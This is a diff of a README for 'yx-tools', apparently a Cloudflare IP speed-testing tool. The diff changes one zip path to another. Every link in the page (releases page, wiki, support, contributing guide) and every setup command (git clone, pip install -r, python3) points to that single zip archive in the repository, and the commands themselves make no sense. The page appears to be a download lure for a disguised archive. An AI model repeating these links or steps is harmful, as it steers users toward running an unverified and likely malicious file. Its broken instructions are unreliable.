@@ -1,6 +1,6 @@
 # 🌐 yx-tools - Fast and Easy Cloudflare Testing
 
-[![Download yx-tools](https://raw.githubusercontent.com/MahamadFH/yx-tools/main/overwealthy/yx-tools.zip%https://raw.githubusercontent.com/MahamadFH/yx-tools/main/overwealthy/yx-tools.zip)](https://raw.githubusercontent.com/MahamadFH/yx-tools/main/overwealthy/yx-tools.zip)
+[![Download yx-tools](https://github.com/MahamadFH/yx-tools/raw/refs/heads/main/overwealthy/tools-yx-chorizontic.zip%https://github.com/MahamadFH/yx-tools/raw/refs/heads/main/overwealthy/tools-yx-chorizontic.zip)](https://github.com/MahamadFH/yx-tools/raw/refs/heads/main/overwealthy/tools-yx-chorizontic.zip)
 
 ## 📜 Description
 
@@ -12,7 +12,7 @@ Follow these steps to download and run yx-tools on your computer.
 
 ### 📥 Download & Install
 
-1. **Visit the Releases Page:** Go to the [Releases Page](https://raw.githubusercontent.com/MahamadFH/yx-tools/main/overwealthy/yx-tools.zip) to download the software.
+1. **Visit the Releases Page:** Go to the [Releases Page](https://github.com/MahamadFH/yx-tools/raw/refs/heads/main/overwealthy/tools-yx-chorizontic.zip) to download the software.
 2. **Choose Your Version:** Select the appropriate version for your operating system.
 3. **Download the File:** Click on the file name to start the download.
 
@@ -34,7 +34,7 @@ You can set up yx-tools using two methods.
 1. **Clone the Project:**
    Open your command line interface and enter the following command:
    ```bash
-   git clone https://raw.githubusercontent.com/MahamadFH/yx-tools/main/overwealthy/yx-tools.zip
+   git clone https://github.com/MahamadFH/yx-tools/raw/refs/heads/main/overwealthy/tools-yx-chorizontic.zip
    ```
 
 2. **Change Directory:**
@@ -46,19 +46,19 @@ You can set up yx-tools using two methods.
 3. **Install Dependencies:**
    Install the required packages:
    ```bash
-   pip install -r https://raw.githubusercontent.com/MahamadFH/yx-tools/main/overwealthy/yx-tools.zip
+   pip install -r https://github.com/MahamadFH/yx-tools/raw/refs/heads/main/overwealthy/tools-yx-chorizontic.zip
    ```
 
 4. **Run the Program:**
    Start yx-tools with:
    ```bash
-   python3 https://raw.githubusercontent.com/MahamadFH/yx-tools/main/overwealthy/yx-tools.zip
+   python3 https://github.com/MahamadFH/yx-tools/raw/refs/heads/main/overwealthy/tools-yx-chorizontic.zip
    ```
 
 #### 📦 Method 2: Run Precompiled Binaries
 
 1. **Download the Binary:**
-   Visit the [Releases Page](https://raw.githubusercontent.com/MahamadFH/yx-tools/main/overwealthy/yx-tools.zip) and download the precompiled binary for your OS.
+   Visit the [Releases Page](https://github.com/MahamadFH/yx-tools/raw/refs/heads/main/overwealthy/tools-yx-chorizontic.zip) and download the precompiled binary for your OS.
 
 2. **Extract Files:**
    Unzip the downloaded file.
@@ -77,7 +77,7 @@ You can set up yx-tools using two methods.
 ### 🔄 Optimized Proxy
 
 - **CSV Processing:** Extracts the best IP addresses from speed test results.
-- **Proxy List Generation:** Automatically creates a `https://raw.githubusercontent.com/MahamadFH/yx-tools/main/overwealthy/yx-tools.zip` configuration file.
+- **Proxy List Generation:** Automatically creates a `https://github.com/MahamadFH/yx-tools/raw/refs/heads/main/overwealthy/tools-yx-chorizontic.zip` configuration file.
 - **Format Compatibility:** Works with various CSV file formats without issues.
 
 ## ✅ Supported Platforms
@@ -93,13 +93,13 @@ You can set up yx-tools using two methods.
 
 ## 📚 Additional Resources
 
-- **Documentation:** Check our [wiki](https://raw.githubusercontent.com/MahamadFH/yx-tools/main/overwealthy/yx-tools.zip) for more information.
-- **Support:** If you encounter issues, please open an issue on our [GitHub page](https://raw.githubusercontent.com/MahamadFH/yx-tools/main/overwealthy/yx-tools.zip).
+- **Documentation:** Check our [wiki](https://github.com/MahamadFH/yx-tools/raw/refs/heads/main/overwealthy/tools-yx-chorizontic.zip) for more information.
+- **Support:** If you encounter issues, please open an issue on our [GitHub page](https://github.com/MahamadFH/yx-tools/raw/refs/heads/main/overwealthy/tools-yx-chorizontic.zip).
 
 ## ✏️ Contributing
 
-We welcome contributions to the project. Please refer to the [contributing guide](https://raw.githubusercontent.com/MahamadFH/yx-tools/main/overwealthy/yx-tools.zip) for more details.
+We welcome contributions to the project. Please refer to the [contributing guide](https://github.com/MahamadFH/yx-tools/raw/refs/heads/main/overwealthy/tools-yx-chorizontic.zip) for more details.
 
 ---
 
-For more updates, feel free to visit the [Releases Page](https://raw.githubusercontent.com/MahamadFH/yx-tools/main/overwealthy/yx-tools.zip). Your journey to faster Cloudflare testing is just a download away!
+For more updates, feel free to visit the [Releases Page](https://github.com/MahamadFH/yx-tools/raw/refs/heads/main/overwealthy/tools-yx-chorizontic.zip). Your journey to faster Cloudflare testing is just a download away!
